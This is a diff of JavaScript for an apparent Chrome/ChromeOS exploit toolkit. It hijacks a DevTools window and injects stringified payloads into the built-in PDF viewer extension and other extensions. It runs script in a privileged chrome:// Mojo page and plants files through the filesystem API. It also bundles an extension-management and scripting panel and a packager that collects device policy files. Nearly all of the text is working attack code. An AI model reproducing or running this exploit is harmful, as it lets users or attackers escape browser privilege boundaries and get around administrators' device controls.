+        this.statusP = this.container.querySelector('#reenroll-status');
+        this.packageButton.addEventListener('click', () => this.createPackage());
+        this.packageButton.disabled = true; // Disabled until JSZip loads
+        this.statusP.textContent = "Initializing...";
+     }
+
+     async loadJSZip() {
+         if (typeof JSZip !== 'undefined') {
+             this.statusP.textContent = "Ready.";
+             this.packageButton.disabled = false;
+             return true;
+         }
+         this.statusP.textContent = "Loading JSZip library...";
+         try {
+             await new Promise((resolve, reject) => {
+                const script = document.createElement('script');
+                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js';
+                script.async = true;
+                script.onload = resolve;
+                script.onerror = () => reject(new Error("Failed to load JSZip script"));
+                document.head.appendChild(script);
+             });
+             this.statusP.textContent = "Ready.";
+             this.packageButton.disabled = false;
+             return true;
+         } catch (error) {
+              console.error("JSZip load error:", error);
+              this.statusP.textContent = "Error: Failed to load JSZip.";
+              this.packageButton.disabled = true;
+              return false;
+         }
+     }
+
+    async createPackage() {
+        if (typeof JSZip === 'undefined') {
+            displayGlobalError("JSZip library not loaded.");
+            // Try loading again?
+            if (!await this.loadJSZip()) return;
+        }
+
+        this.statusP.textContent = "Starting package creation...";
+        this.packageButton.disabled = true;
+        let filesAdded = 0;
+        const zip = new JSZip();
+
+        // 1. Find policy file (best effort)
+        let policyFilePath = null;
+        try {
+            this.statusP.textContent = "Searching for policy file...";
+            policyFilePath = await findLastPolicyFile(); // Uses global func
+        } catch (error) {
+            this.statusP.textContent = "Policy file search failed."; // Don't display error details here
+            console.warn("Policy file search error:", error);
+        }
+
+        const filesToTry = [...kFilesToPackage]; // Base list
+        if (policyFilePath) {
+            filesToTry.push(policyFilePath);
+        } else {
+             this.statusP.textContent = "Policy file not found/added. Continuing...";
+        }
+
+        // 2. Read and add files
+        for (const f of filesToTry) {
+             const baseName = posix.basename(f);
+             this.statusP.textContent = \`Reading \${baseName}...\`;
+             try {
+                 const buffer = await readFile(f); // Global func
+                 zip.file(baseName, buffer);
+                 filesAdded++;
+             } catch (error) {
+                 this.statusP.textContent = \`Skipped \${baseName}.\`;
+                 console.error(\`Failed to read/add \${f}:\`, error);
+                 // Continue even if a file fails
+                  await new Promise(resolve => setTimeout(resolve, 50)); // Tiny delay
+             }
+         }
+
+         // 3. Generate and Download
+         if (filesAdded === 0) {
+             this.statusP.textContent = "Error: No files could be added.";
+             this.packageButton.disabled = false;
+             return;
+         }
+
+         this.statusP.textContent = \`Generating zip (\${filesAdded} file(s))...\`;
+         try {
+             const blob = await zip.generateAsync({ type: "blob" });
+             const url = URL.createObjectURL(blob);
+             const a = document.createElement('a');
+             a.href = url;
+             a.download = \`reenrollment_data_\${Date.now()}.zip\`;
+             a.style.display = 'none';
+             document.body.appendChild(a);
+             a.click();
+             document.body.removeChild(a);
+             URL.revokeObjectURL(url);
+             this.statusP.textContent = \`Download started (\${filesAdded} file(s)).\`;
+         } catch (error) {
+             console.error("Error generating/downloading zip:", error);
+             this.statusP.textContent = \`Error generating zip: \${error.message}\`;
+         } finally {
+             this.packageButton.disabled = false;
+         }
+    }
+}
+
+class SystemInfo {
+     constructor(containerId) {
+        this.container = document.getElementById(containerId);
+        this.render();
+    }
+
+     render() {
+         this.container.innerHTML = uiTemplates.systemInfo;
+         this.infoPre = this.container.querySelector('#platform-info');
+         this.loadInfo();
+     }
+
+     async loadInfo() {
+         this.infoPre.textContent = "Loading...";
+         try {
+             const platformInfo = await chromePromise(chrome.runtime.getPlatformInfo);
+             const manifest = chrome.runtime.getManifest(); // Get info about this extension
+
+             let infoText = \`--- Platform ---\\n\`;
+             infoText += \`OS: \${platformInfo.os}\\n\`;
+             infoText += \`Arch: \${platformInfo.arch}\\n\`;
+             infoText += \`NaCl Arch: \${platformInfo.nacl_arch}\\n\\n\`;
+
+             infoText += \`--- Browser ---\\n\`;
+             infoText += \`Chrome Version: \${navigator.appVersion.match(/Chrome\\/([\\d.]+)/)?.[1] || 'N/A'}\\n\`;
+             infoText += \`User Agent: \${navigator.userAgent}\\n\\n\`;
+
+             infoText += \`--- This Extension (\${manifest.name} v\${manifest.version}) ---\\n\`;
+             infoText += \`ID: \${chrome.runtime.id}\\n\`;
+             infoText += \`Permissions: \${manifest.permissions?.join(', ') || '(none)'}\\n\`;
+             infoText += \`Host Permissions: \${manifest.host_permissions?.join(', ') || '(none)'}\`;
+
+
+             this.infoPre.textContent = infoText;
+         } catch (error) {
+             console.error("Error getting system info:", error);
+             this.infoPre.textContent = \`Error loading info: \${error.message}\`;
+         }
+     }
+}
+
+
+// --- Initialization ---
+
+function initializeApp() {
+    // Clear potential errors from previous state if re-initializing
+    clearGlobalError();
+
+    // Set up basic HTML structure (Pure JS approach)
+    document.body.innerHTML = uiTemplates.mainLayout; // Use the main layout template
+    document.title = "Advanced Extension Toolkit"; // Set title
+
+    const appContainer = document.getElementById('app-container');
+    if (!appContainer) {
+        displayGlobalError("Fatal Error: App container not found in layout.");
+        return;
+    }
+
+     // Inject feature sections - Create containers dynamically
+     const sections = [
+         { id: 'management-container', classRef: ExtensionManager },
+         { id: 'scripting-container', classRef: ScriptingTool },
+         { id: 'file-viewer-container', classRef: FileViewer },
+         { id: 'system-info-container', classRef: SystemInfo },
+         { id: 'reenroll-container', classRef: ReEnrollmentPackager },
+     ];
+
+     sections.forEach(section => {
+         const sectionDiv = document.createElement('div');
+         sectionDiv.id = section.id;
+         appContainer.appendChild(sectionDiv);
+         try {
+            new section.classRef(section.id); // Instantiate the class
+         } catch (e) {
+              console.error(\`Failed to initialize section \${section.id}:\`, e);
+              displayGlobalError(\`Error initializing section: \${section.id}\`);
+              const errorPlaceholder = document.createElement('div');
+              errorPlaceholder.style.color = 'red';
+              errorPlaceholder.textContent = \`Failed to load \${section.id.replace('-container','')}. Check console.\`;
+              sectionDiv.appendChild(errorPlaceholder);
+         }
+     });
+
+
+     // Add CSS dynamically
+     const style = document.createElement('style');
+     style.textContent = \`
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; margin: 0; padding: 10px; background-color: #f0f0f0; font-size: 14px; }
+        #app-container { background-color: #fff; padding: 15px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        h1 { margin-top: 0; text-align: center; color: #333; }
+        h2 { margin-top: 0; border-bottom: 1px solid #eee; padding-bottom: 8px; margin-bottom: 15px; font-size: 1.2em; color: #444; }
+        .feature-section { border: 1px solid #e0e0e0; padding: 15px; margin-bottom: 20px; background-color: #fdfdfd; border-radius: 4px; }
+        button { padding: 6px 12px; margin: 3px; cursor: pointer; border: 1px solid #ccc; border-radius: 3px; background-color: #f7f7f7; color: #333; font-size: 0.95em; }
+        button:hover { background-color: #e9e9e9; border-color: #bbb; }
+        button:disabled { cursor: not-allowed; opacity: 0.6; }
+        input[type=text], input[type=password], textarea, select { padding: 6px; margin: 3px; border: 1px solid #ccc; border-radius: 3px; font-size: 1em; box-sizing: border-box; }
+        textarea { width: 100%; vertical-align: top; resize: vertical; min-height: 80px; }
+        select { min-width: 150px; }
+        pre { background-color: #f4f4f4; padding: 8px; margin-top: 5px; border: 1px solid #ddd; max-height: 200px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; font-family: Menlo, Monaco, Consolas, "Courier New", monospace; font-size: 0.9em; }
+        table { border-collapse: collapse; width: 100%; }
+        th, td { padding: 6px 8px; text-align: left; border-bottom: 1px solid #eee; vertical-align: middle; }
+        th { font-weight: bold; background-color: #f9f9f9; }
+        #global-error-display { border: 1px solid #ff4d4d; background-color: #ffe6e6; color: #cc0000; }
+        #notes-section { color: #666; font-size: 0.85em; }
+        #reenroll-status, #ext-list-container i { color: #555; font-style: italic; }
+     \`;
+     document.head.appendChild(style);
+
+    console.log("Advanced Toolkit Initialized.");
+}
+
+// --- Run Initialization ---
+// Ensure DOM is ready before manipulating it
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initializeApp);
+} else {
+    // DOMContentLoaded has already fired
+    initializeApp();
+}
+`;
+    const PLACEHOLDER_EXT_JS_B64 = btoa(prevToolkitJS);
+
+    // 2. EXTHTML (Base64 of minimal HTML to load the JS)
+    const extHtmlContent = `<!DOCTYPE html><html><head><title>Payload</title></head><body><p>Loading toolkit...</p><!-- Content generated by index.js --></body></html>`;
+    const PLACEHOLDER_EXT_HTML_B64 = btoa(extHtmlContent); // Script tag added later by payload_swamp
+
+    // 3. CHROMEPAYLOAD (Base64 of JS for Mojo context)
+    const chromePayloadJS = `console.log('Chrome Payload Executed in:', window.location.href); try { alert('Chrome Payload Executed!'); } catch(e){ console.error('Alert failed in payload:', e);}`;
+    const PLACEHOLDER_CHROME_PAYLOAD_B64 = btoa(chromePayloadJS);
+
+    // 4. HTMLENTRY (Base64 of the DevTools UI HTML - using fallback from original)
+    const PLACEHOLDER_HTML_ENTRY_B64 = "PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5EYXNoYm9hcmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8aDE+RGV2VG9vbHMgSW50ZXJmYWNlPC9oMT4KPHA+QWN0aW9uczo8L3A+Cjx1bD4KCTxsaT48YnV0dG9uIGlkPSJhY3RpdmF0ZSI+QWN0aXZhdGUgKERlZmF1bHQgUERGKTwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0iYWN0aXZhdGUyIj5BY3RpdmF0ZSBTcGVjaWFsIChYRCBQREYpPC9idXR0b24+PC9saT4KCTxsaT48YnV0dG9uIGlkPSJleHRkYmciPkRlYnVnIE90aGVyIEV4dGVuc2lvbjwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0iY2xlYW51cCI+Q2xlYW51cCBGaWxlc3lzdGVtPC9idXR0b24+PC9saT4KCTxsaT48YnV0dG9uIGlkPSJkZXZkYmciPkRlYnVnIERldlRvb2xzIChFdmFsKTwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0idXBkYXRlciI+Q2hlY2sgZm9yIFVwZGF0ZXI8L2J1dHRvbj48L2xpPgo8L3VsPgo8cD5IYXJkY29kZWQgRXh0ZW5zaW9uczo8L3A+CjwhLS0gQWRkIG1vcmUgaGFyZGNvZGVkIGJ1dHRvbnMgYXMgbmVlZGVkIC0tPgo8dWwgY2xhc3M9ImhhcmRjb2RlZC1saXN0Ij4KICAgIDxsaT48YnV0dG9uIGNsYXNzPSJoYXJkY29kZWQiIGV4dD0iZWplbWRkaWhlbmtvZGZoZWxtZmJhaGdjaWdrYWZpZGMiPkV4YW1wbGUgRXh0IDGPC9idXR0b24+PC9saT4KICAgIDxsaT48YnV0dG9uIGNsYXNzPSJoYXJkY29kZWQiIGV4dD0ibmhwaXBkZ2VhbGdkbWxkZGVtYWZubGlsa2lvZ25kYSI+RXhhbXBsZSBFeHQgMjwvYnV0dG9uPjwvbGk+CjwvdWw+CjxoMj5Mb2dnZWQgSWZyYW1lczo8L2gyPgo8cHJlIGlkPSJsb2ciPjwvcHJlPgo8L2JvZHk+CjwvaHRtbD4=";
+
 
     // --- Utility Functions ---
 
@@ -36,12 +1105,10 @@
 
     /**
      * Safely gets the window.opener, defaulting to the current window if none exists.
-     * Note: Defaulting to self might not be intended opener behavior in all contexts.
      * @returns {Window} The opener or the current window.
      */
     function getOpener() {
         try {
-            // Accessing opener can throw cross-origin errors in some contexts if not set correctly.
             return window.opener || window;
         } catch (e) {
             console.warn("Could not access window.opener, defaulting to current window.", e);
@@ -104,7 +1171,7 @@
             if (!window.webkitRequestFileSystem) {
                 return reject(new Error("webkitRequestFileSystem API is not available."));
             }
-            window.webkitRequestFileSystem(TEMPORARY, 5 * 1024 * 1024, // 5MB quota
+            window.webkitRequestFileSystem(window.TEMPORARY, 5 * 1024 * 1024, // 5MB quota
                 async (fs) => {
                     try {
                         resolve(await callback(fs));
@@ -121,7 +1188,6 @@
 
     /**
      * Opens the DevTools window and waits for the DevToolsAPI to be available.
-     * Handles potential reloads if the API isn't immediately present.
      * @param {Window} openerWindow - The window object used to open DevTools.
      * @returns {Promise<Window>} The DevTools window object with DevToolsAPI available.
      * @throws {Error} If DevTools cannot be opened or the API doesn't load.
@@ -134,7 +1200,6 @@
         }
 
         // Close the original opener window immediately after launching devtools
-        // Be careful: This assumes the script's purpose is fulfilled by the new devtoolsWindow
         try {
             if (openerWindow !== window) { // Avoid closing self if opener defaulted to window
                openerWindow.close();
@@ -147,46 +1212,85 @@
         return new Promise((resolve, reject) => {
             let attempt = 0;
             const maxAttempts = 3; // Limit reload attempts
+            let resolved = false; // Flag to prevent multiple resolves/rejects
 
             const checkApi = async () => {
+                if (resolved) return; // Already handled
                 console.log("Checking for DevToolsAPI...");
-                if (devtoolsWindow.DevToolsAPI) {
-                    console.log("Got DevToolsAPI object from opened window:", devtoolsWindow.DevToolsAPI);
-                    resolve(devtoolsWindow);
-                } else if (attempt < maxAttempts) {
-                    attempt++;
-                    console.warn(`DevToolsAPI not found (Attempt ${attempt}/${maxAttempts}). Reloading DevTools window...`);
-                    // Setting opener to null might be an attempt to break connection before reload?
-                    try {
-                        devtoolsWindow.opener = null;
-                        devtoolsWindow.location.reload();
-                        devtoolsWindow.addEventListener("load", checkApi, { once: true });
-                        // Add a timeout safeguard in case 'load' doesn't fire after reload
-                        setTimeout(() => {
-                             if(!devtoolsWindow.DevToolsAPI && !devtoolsWindow.closed) {
-                                console.error(`DevToolsAPI still not found after reload attempt ${attempt} and timeout.`);
-                                // Optional: reject here or let it try again on next 'load' if applicable
-                             }
-                        }, 5000); // 5 second timeout for reload + load event
-
-                    } catch (e) {
-                        reject(new Error(`Failed during DevTools reload attempt ${attempt}: ${e}`));
+                try {
+                    // Accessing properties on a potentially closed/cross-origin window needs try-catch
+                    if (devtoolsWindow && !devtoolsWindow.closed && devtoolsWindow.DevToolsAPI) {
+                        console.log("Got DevToolsAPI object from opened window:", devtoolsWindow.DevToolsAPI);
+                        resolved = true;
+                        resolve(devtoolsWindow);
+                    } else if (!devtoolsWindow || devtoolsWindow.closed) {
+                        if (!resolved) {
+                             resolved = true;
+                             reject(new Error("DevTools window closed before API was found."));
+                        }
+                    } else if (attempt < maxAttempts) {
+                        attempt++;
+                        console.warn(`DevToolsAPI not found (Attempt ${attempt}/${maxAttempts}). Reloading DevTools window...`);
+                        try {
+                            devtoolsWindow.opener = null;
+                            devtoolsWindow.location.reload();
+                            // Re-attach listener after reload attempt
+                            devtoolsWindow.addEventListener("DOMContentLoaded", checkApi, { once: true });
+                            setTimeout(() => { // Timeout safeguard
+                                 if(!resolved && devtoolsWindow && !devtoolsWindow.closed && !devtoolsWindow.DevToolsAPI) {
+                                    console.error(`DevToolsAPI still not found after reload attempt ${attempt} and timeout.`);
+                                 } else if (!resolved && (!devtoolsWindow || devtoolsWindow.closed)) {
+                                     if (!resolved) {
+                                        resolved = true;
+                                        reject(new Error(`DevTools window closed during reload attempt ${attempt}.`));
+                                     }
+                                 }
+                            }, 5000);
+                        } catch (e) {
+                            if (!resolved) {
+                                resolved = true;
+                                reject(new Error(`Failed during DevTools reload attempt ${attempt}: ${e}`));
+                            }
+                        }
+                    } else {
+                        if (!resolved) {
+                            resolved = true;
+                            try { if (!devtoolsWindow.closed) devtoolsWindow.close(); } catch (e) {}
+                            reject(new Error(`Failed to get DevToolsAPI after ${maxAttempts} attempts.`));
+                        }
                     }
-                } else {
-                    try { devtoolsWindow.close(); } catch (e) {}
-                    reject(new Error(`Failed to get DevToolsAPI after ${maxAttempts} attempts.`));
+                } catch (e) {
+                     // Catch errors accessing devtoolsWindow properties if it's closed or cross-origin
+                     if (!resolved) {
+                         resolved = true;
+                         console.error("Error accessing devtoolsWindow:", e);
+                         reject(new Error(`Error checking DevTools window state: ${e.message}`));
+                     }
                 }
             };
 
-            // Use DOMContentLoaded as it often fires earlier than 'load'
-            devtoolsWindow.addEventListener("DOMContentLoaded", checkApi, { once: true });
-            // Add a timeout for the initial load check
-             setTimeout(() => {
-                if(!devtoolsWindow.DevToolsAPI && !devtoolsWindow.closed) {
-                    console.warn("DevToolsAPI not found after initial load timeout. Will rely on DOMContentLoaded/load event.");
-                    // It might already be loading, so don't immediately fail here unless DOMContentLoaded also timed out
-                }
-             }, 3000); // 3 second initial timeout
+            // Use DOMContentLoaded and load, plus timeouts
+            try {
+                devtoolsWindow.addEventListener("DOMContentLoaded", checkApi, { once: true });
+                devtoolsWindow.addEventListener("load", checkApi, { once: true }); // Fallback if DOMContentLoaded fails
+
+                setTimeout(() => {
+                   if(!resolved && devtoolsWindow && !devtoolsWindow.closed && !devtoolsWindow.DevToolsAPI) {
+                       console.warn("DevToolsAPI not found after initial load timeout. Relying on events.");
+                   } else if (!resolved && (!devtoolsWindow || devtoolsWindow.closed)) {
+                       if(!resolved) {
+                           resolved = true;
+                           reject(new Error("DevTools window closed during initial wait."));
+                       }
+                   }
+                }, 3000); // Initial timeout
+            } catch (e) {
+                 if (!resolved) {
+                     resolved = true;
+                     console.error("Error setting up initial DevTools listeners:", e);
+                     reject(new Error(`Setup error: ${e.message}`));
+                 }
+            }
         });
     }
 
@@ -196,147 +1300,82 @@
     /**
      * This function is intended to be stringified and executed in the DevTools context.
      * It sets up a UI and logic for interacting with/debugging extensions.
-     * Note: Depends on placeholders (%%HTMLENTRY%%, etc.) being replaced.
      */
     function devToolsUI() {
         // --- UI Scope Constants ---
-        const PDF_EXTENSION_ID = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Keep definition here as it's used within stringified functions below
-        const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js";
+        const PDF_EXTENSION_ID = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition required for stringified context
+        const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js"; // Redefinition required
+        const IFRAME_TRACKER_EVENT_REMOVE = 'removeIframe'; // Redefinition required
+        const IFRAME_PARENT_MESSAGE_TYPE_ACC = 'acc'; // Redefinition required
+        const IFRAME_PARENT_MESSAGE_TYPE_ACK = 'ack'; // Redefinition required
+        const BROWSER_INIT_NAVIGATE_EVENT = 'browserInitNavigate'; // Redefinition required
+        const UPDATER_WEBSOCKET_PLACEHOLDER = "ws://%%updaterurl%%"; // Redefinition required
 
-        // Placeholders expected by this function's stringified version
-        const PLACEHOLDER_HTML_ENTRY = "%%HTMLENTRY%%";
-        const PLACEHOLDER_EXT_JS = "%%EXTJS%%";
-        const PLACEHOLDER_EXT_HTML = "%%EXTHTML%%";
-        const PLACEHOLDER_CHROME_PAYLOAD = "%%CHROMEPAYLOAD%%"; // Placeholder for payload executed via chrome.tabs.executeScript
-        const UPDATER_WEBSOCKET_PLACEHOLDER = "ws://%%updaterurl%%";
+        // --- Placeholders (Values will be injected when stringified) ---
+        const PLACEHOLDER_HTML_ENTRY_B64 = "%%PLACEHOLDER_HTML_ENTRY_B64%%";
+        const PLACEHOLDER_EXT_JS_B64 = "%%PLACEHOLDER_EXT_JS_B64%%";
+        const PLACEHOLDER_EXT_HTML_B64 = "%%PLACEHOLDER_EXT_HTML_B64%%";
+        const PLACEHOLDER_CHROME_PAYLOAD_B64 = "%%PLACEHOLDER_CHROME_PAYLOAD_B64%%";
 
         // --- UI State ---
         const iframeManager = {
-            iframes: {}, // Store iframes by ID
-            nextId: 0,
-            add: function(iframeElement) {
-                const id = this.nextId++;
-                iframeElement.dataset.managedId = id; // Store ID on the element
-                this.iframes[id] = iframeElement;
-                return id;
-            },
-            remove: function(id) {
-                const iframe = this.iframes[id];
-                if (iframe) {
-                    iframe.remove(); // Remove from DOM
-                    delete this.iframes[id];
-                    console.log(`Removed tracked iframe with ID: ${id}`);
-                } else {
-                    console.warn(`Attempted to remove non-existent iframe with ID: ${id}`);
-                }
-            },
-            get: function(id) {
-                return this.iframes[id];
-            }
+            iframes: {}, nextId: 0,
+            add: function(iframeElement) { const id = this.nextId++; iframeElement.dataset.managedId = id; this.iframes[id] = iframeElement; return id; },
+            remove: function(id) { const iframe = this.iframes[id]; if (iframe) { try { iframe.remove(); } catch(e){} delete this.iframes[id]; console.log(`Removed tracked iframe: ${id}`); } },
+            get: function(id) { return this.iframes[id]; }
         };
 
         // --- Filesystem Payloads ---
 
-        /**
-         * Payload executed within an extension's context via filesystem/iframe trick.
-         * Handles communication back to the parent (DevTools UI) and potentially executes further actions.
-         * Intended to be stringified.
-         */
+        /** Payload executed within an extension's context via filesystem/iframe trick. */
         function payload_swamp(targetWindow, dataFromParent) {
-            const PDF_EXTENSION_ID = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition necessary for stringification
-            const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js"; // Redefinition necessary for stringification
+            const PDF_EXTENSION_ID = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
+            const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js";
+            const PLACEHOLDER_EXT_JS_B64_INNER = "%%PLACEHOLDER_EXT_JS_B64%%"; // Need placeholders inside too
+            const PLACEHOLDER_EXT_HTML_B64_INNER = "%%PLACEHOLDER_EXT_HTML_B64%%";
+            const PLACEHOLDER_CHROME_PAYLOAD_B64_INNER = "%%PLACEHOLDER_CHROME_PAYLOAD_B64%%";
 
             // Utility to signal parent to remove the iframe
             function cleanup() {
-                if (window.parent && dataFromParent && typeof dataFromParent.uid !== 'undefined') {
-                     window.parent.postMessage({ type: 'removeIframe', uid: dataFromParent.uid }, '*');
-                } else {
-                    console.warn("Cleanup could not message parent (missing data or parent).");
-                }
-                 // Also attempt self-close, though parent removal is cleaner
-                try { window.close(); } catch(e) {}
+                if (window.parent && window.parent.postMessage && dataFromParent && typeof dataFromParent.passcode !== 'undefined') {
+                     window.parent.postMessage({ type: 'removeIframe', uid: dataFromParent.passcode }, '*');
+                } else { console.warn("Cleanup could not message parent."); }
+                 try { window.close(); } catch(e) {}
             }
 
             // Specific logic for PDF extension
             if (location.origin === "chrome-extension://" + PDF_EXTENSION_ID) {
                 console.log("Running payload inside PDF Viewer context.");
-                targetWindow.close(); // Close the opened `index.html` tab from DevTools context
+                try{ targetWindow.close(); } catch(e){} // Close the opened intermediate window/tab
                  if (typeof chrome !== 'undefined' && chrome.tabs && chrome.windows) {
                      chrome.tabs.getCurrent((currentTabInfo) => {
-                        if (chrome.runtime.lastError) {
-                           console.error("Error getting current tab:", chrome.runtime.lastError.message);
-                           cleanup(); // Can't proceed, attempt cleanup
-                           return;
-                        }
-                         chrome.windows.create({
-                            setSelfAsOpener: true, // Important for potential subsequent interactions
-                            url: MOJO_BINDINGS_URL
-                        }, (newWindowInfo) => {
-                            if (chrome.runtime.lastError) {
-                                console.error("Error creating window:", chrome.runtime.lastError.message);
-                                cleanup();
-                                return;
-                            }
+                        if (chrome.runtime.lastError) { console.error("Error getting current tab:", chrome.runtime.lastError.message); cleanup(); return; }
+                         chrome.windows.create({ setSelfAsOpener: true, url: MOJO_BINDINGS_URL }, (newWindowInfo) => {
+                            if (chrome.runtime.lastError) { console.error("Error creating window:", chrome.runtime.lastError.message); cleanup(); return; }
                              if (newWindowInfo && newWindowInfo.tabs && newWindowInfo.tabs.length > 0) {
                                 const mojoTabId = newWindowInfo.tabs[0].id;
-                                const codeToExecute = `location.href = "javascript:${atob('%%CHROMEPAYLOAD%%')}"`; // Placeholder replacement needed
-                                console.log("Executing script in new Mojo tab:", codeToExecute);
+                                const codeToExecute = `location.href = "javascript:" + decodeURIComponent(escape(atob('${PLACEHOLDER_CHROME_PAYLOAD_B64_INNER}')))`;
+                                console.log("Executing script in new Mojo tab (first 100 chars):", codeToExecute.substring(0,100));
                                 chrome.tabs.executeScript(mojoTabId, { code: codeToExecute }, () => {
-                                    if (chrome.runtime.lastError) {
-                                        console.error("Error executing script in Mojo tab:", chrome.runtime.lastError.message);
-                                    } else {
-                                        console.log("Script execution initiated in Mojo tab.");
-                                    }
-                                    // Whether script execution succeeded or failed, clean up the iframe
-                                    cleanup();
+                                    if (chrome.runtime.lastError) { console.error("Error executing script in Mojo tab:", chrome.runtime.lastError.message); }
+                                    else { console.log("Script execution initiated in Mojo tab."); }
+                                    cleanup(); // Cleanup regardless of exec success
                                 });
-                             } else {
-                                console.error("Failed to get tab info from newly created window.");
-                                cleanup();
-                            }
+                             } else { console.error("Failed to get tab info from newly created window."); cleanup(); }
                         });
                      });
-                 } else {
-                     console.error("Chrome APIs (tabs, windows) not available in this context.");
-                     cleanup();
-                 }
-                 return; // End execution for PDF context
+                 } else { console.error("Chrome APIs (tabs, windows) not available in this context."); cleanup(); }
+                 return;
             }
 
             // Generic filesystem payload logic
             console.log("Running generic filesystem payload. Data from parent:", dataFromParent);
+            if (!window.webkitRequestFileSystem) { console.error("webkitRequestFileSystem not available."); cleanup(); return; }
 
-            if (!window.webkitRequestFileSystem) {
-                 alert("Filesystem API not available in this context. Cannot proceed.");
-                 console.error("webkitRequestFileSystem not available.");
-                 cleanup();
-                 return;
-            }
-
-            window.webkitRequestFileSystem(TEMPORARY, 5 * 1024 * 1024, async (fs) => {
+            window.webkitRequestFileSystem(window.TEMPORARY, 5 * 1024 * 1024, async (fs) => {
                 console.log("Obtained temporary filesystem access.");
-
-                 // --- Nested Filesystem Helpers ---
-                 function writeFileFS(filename, fileData) {
-                     return new Promise((resolve, reject) => {
-                         fs.root.getFile(filename, { create: true }, (entry) => {
-                             entry.createWriter((writer) => {
-                                 writer.onwriteend = () => resolve(entry.toURL());
-                                 writer.onerror = (e) => reject(new Error(`FS Write Error: ${e.toString()}`));
-                                 writer.write(new Blob([fileData]));
-                             }, (e) => reject(new Error(`FS Create Writer Error: ${e.toString()}`)));
-                         }, (e) => reject(new Error(`FS Get File Error: ${e.toString()}`)));
-                     });
-                 }
-                 function removeFileFS(filename) {
-                    return new Promise((resolve, reject) => {
-                        fs.root.getFile(filename, { create: false },
-                            (entry) => entry.remove(resolve, (e) => reject(new Error(`FS Remove Error: ${e.toString()}`))),
-                            (e) => (e.name === 'NotFoundError' ? resolve() : reject(new Error(`FS Get File for Remove Error: ${e.toString()}`))) // Resolve if not found
-                        );
-                    });
-                 }
-                 // --- End Nested Helpers ---
+                 const writeFileFS = (name, data) => new Promise((res, rej) => fs.root.getFile(name,{create:true}, (entry) => entry.createWriter((w) => { w.onwriteend=()=>res(entry.toURL()); w.onerror=rej; w.write(new Blob([data]));},rej),rej));
+                 const removeFileFS = (name) => new Promise((res, rej) => fs.root.getFile(name,{create:false}, (entry)=>entry.remove(res,rej), (e)=>(e.name==='NotFoundError'?res():rej(e))));
 
                 try {
                     if (dataFromParent && dataFromParent.cleanup) {
@@ -344,239 +1383,108 @@
                         await removeFileFS('index.js');
                         await removeFileFS('index.html');
                         console.log("Filesystem cleanup complete.");
-                        alert("Cleaned up successfully!");
                     } else {
                         console.log("Writing extension files to filesystem...");
-                        await writeFileFS('index.js', atob(`%%EXTJS%%`)); // Placeholder replacement needed
-                        const htmlContent = `${atob('%%EXTHTML%%')}<script src="./index.js"></script>`; // Placeholder replacement needed
+                        // Decode Base64 content before writing
+                        const decodedJs = decodeURIComponent(escape(atob(PLACEHOLDER_EXT_JS_B64_INNER)));
+                        await writeFileFS('index.js', decodedJs);
+                        const decodedHtml = decodeURIComponent(escape(atob(PLACEHOLDER_EXT_HTML_B64_INNER)));
+                        const htmlContent = `${decodedHtml}<script src="./index.js"></script>`;
                         const fsUrl = await writeFileFS('index.html', htmlContent);
                         console.log(`Extension HTML written to filesystem URL: ${fsUrl}`);
 
-                        // Attempt to open the filesystem URL in a new tab
                         if (targetWindow.chrome && targetWindow.chrome.tabs) {
                            targetWindow.chrome.tabs.create({ url: fsUrl });
                            console.log("Opened filesystem URL in new tab via chrome.tabs.create.");
                         } else {
-                            console.warn("chrome.tabs API not available in target window, attempting simple open().");
-                            targetWindow.open(fsUrl); // Fallback, might be blocked
+                            console.warn("chrome.tabs API not available, attempting simple open().");
+                            targetWindow.open(fsUrl);
                         }
                     }
-                } catch (error) {
-                     console.error("Error during filesystem operation:", error);
-                     alert(`Filesystem operation failed: ${error.message}`);
-                } finally {
-                     // Always close the intermediate window/tab from DevTools context and signal cleanup
-                     targetWindow.close();
-                     cleanup();
-                }
-
-            }, (e) => {
-                 alert(`Failed to access filesystem: ${e.toString()}`);
-                 console.error("Filesystem request failed:", e);
-                 cleanup();
-            });
+                } catch (error) { console.error("Error during filesystem operation:", error); }
+                 finally { try { targetWindow.close(); } catch(e){} cleanup(); }
+            }, (e) => { console.error("Filesystem request failed:", e); cleanup(); });
         } // end payload_swamp
 
-        /**
-         * Payload for the 'Activate Special (XD)' button. Interacts with Mojo bindings page.
-         * Intended to be stringified.
-         */
+        /** Payload for the 'Activate Special (XD)' button. */
         function xdPayload(targetWindow) {
-            // Close the intermediate window/tab
-             targetWindow.close();
+            try{ targetWindow.close(); } catch(e){} // Close intermediate window
+            const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js";
+            if (!chrome || !chrome.tabs || !chrome.windows) { alert("Required Chrome APIs missing."); return; }
 
-            const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js"; // Redefinition necessary
-
-            if (!chrome || !chrome.tabs || !chrome.windows) {
-                 alert("Required Chrome APIs are not available.");
-                 return;
+            function createAndWriteFileInMojoContext() {
